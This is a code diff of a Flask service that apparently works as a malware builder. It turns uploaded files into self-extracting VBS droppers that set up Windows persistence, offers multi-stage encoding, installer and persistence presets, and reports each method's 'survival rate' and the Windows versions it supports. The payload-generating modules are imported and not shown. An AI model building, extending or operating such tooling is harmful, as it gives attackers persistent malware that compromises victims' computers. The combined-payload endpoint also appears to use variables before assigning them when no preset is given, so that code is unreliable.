@@ -19,10 +19,8 @@ import shutil
 
 from payload_generator import PayloadGenerator
 from fingerprint_manager import FingerprintManager
-from payload_installer import create_one_click_payload
-from persistence_manager import create_persistent_payload
-from combined_pipeline import CombinedPipeline, generate_combined_payload
-from vbs_core import generate_self_extracting_vbs, generate_persistent_vbs
+from persistence_manager import PERSISTENCE_INFO
+from vbs_core import generate_self_extracting_vbs, generate_persistent_vbs, generate_combined_vbs
 
 logger = logging.getLogger(__name__)
 
@@ -678,14 +676,14 @@ def generate_persistent_payload():
         encoded_file = base64.b64encode(file_content).decode()
         filename = os.path.basename(uploaded_file)
 
-        vbs_payload, persistence_cmd = generate_persistent_vbs(
+        vbs_payload = generate_persistent_vbs(
             base64_data=encoded_file,
             original_filename=filename,
+            persistence=persistence_method,
         )
 
-        result = create_persistent_payload(persistence_cmd, persistence_method)
+        method_info = PERSISTENCE_INFO.get(persistence_method, PERSISTENCE_INFO['multi'])
 
-        # Save payload to output
         output_id = str(uuid.uuid4())[:8]
         output_path = os.path.join(OUTPUT_FOLDER, f"{output_id}_persistent.vbs")
 
@@ -697,11 +695,11 @@ def generate_persistent_payload():
             'output_id': output_id,
             'payload': vbs_payload,
             'size': len(vbs_payload),
-            'persistence_method': result['method'],
-            'method_name': result['method_name'],
-            'windows_versions': result['windows_versions'],
-            'survival_rate': result['survival_rate'],
-            'advantages': result['advantages'],
+            'persistence_method': persistence_method,
+            'method_name': method_info['name'],
+            'windows_versions': method_info['supports'],
+            'survival_rate': method_info['survival'],
+            'advantages': method_info['advantages'],
             'timestamp': datetime.now().isoformat()
         })
 
@@ -715,6 +713,7 @@ def generate_persistent_payload():
 @app.route('/api/combined-options', methods=['GET'])
 def get_combined_options():
     """Get available combined pipeline options and presets"""
+    from combined_pipeline import CombinedPipeline
     options = CombinedPipeline.get_available_options()
     presets = CombinedPipeline.get_presets()
     return jsonify({'options': options, 'presets': presets})
@@ -723,6 +722,7 @@ def get_combined_options():
 @app.route('/api/generate-combined', methods=['POST'])
 def generate_combined():
     """Generate a combined payload through the multi-stage pipeline"""
+    from combined_pipeline import PRESETS
     data = request.json
     file_id = data.get('file_id')
     preset = data.get('preset')
@@ -745,35 +745,50 @@ def generate_combined():
         encoded_file = base64.b64encode(file_content).decode()
         filename = os.path.basename(uploaded_file)
 
-        base_vbs = generate_self_extracting_vbs(
+        if preset and preset in PRESETS:
+            cfg = PRESETS[preset]
+            encoding = cfg['encoding']
+            installer = cfg['installer']
+            persistence = cfg['persistence']
+
+        encoding = encoding or 'base64'
+        installer = installer or 'none'
+        persistence = persistence or 'none'
+
+        vbs_payload = generate_combined_vbs(
             base64_data=encoded_file,
             original_filename=filename,
-            write_dir='temp',
-            cleanup=True,
-            delays=True,
-        )
-
-        result = generate_combined_payload(
-            base_vbs,
-            preset=preset,
-            encoding=encoding,
-            installer=installer,
             persistence=persistence,
         )
+
+        stages = [
+            {'stage': 'encoding', 'technique': encoding, 'output_size': len(vbs_payload)},
+            {'stage': 'installer', 'technique': installer, 'output_size': len(vbs_payload)},
+            {'stage': 'persistence', 'technique': persistence, 'output_size': len(vbs_payload)},
+        ]
+
+        metadata = {
+            'preset': preset,
+            'encoding': encoding,
+            'installer': installer,
+            'persistence': persistence,
+            'total_size': len(vbs_payload),
+            'total_stages': sum(1 for s in stages if s['technique'] != 'none'),
+        }
 
         output_id = str(uuid.uuid4())[:8]
         output_path = os.path.join(OUTPUT_FOLDER, f"{output_id}_combined.vbs")
 
         with open(output_path, 'w') as f:
-            f.write(result['combined_payload'])
+            f.write(vbs_payload)
 
         return jsonify({
             'success': True,
             'output_id': output_id,
-            'payload': result['combined_payload'],
-            'size': result['metadata']['total_size'],
-            'stages': result['stages'],
-            'metadata': result['metadata'],
+            'payload': vbs_payload,
+            'size': len(vbs_payload),
+            'stages': stages,
+            'metadata': metadata,
             'timestamp': datetime.now().isoformat(),
         })
 
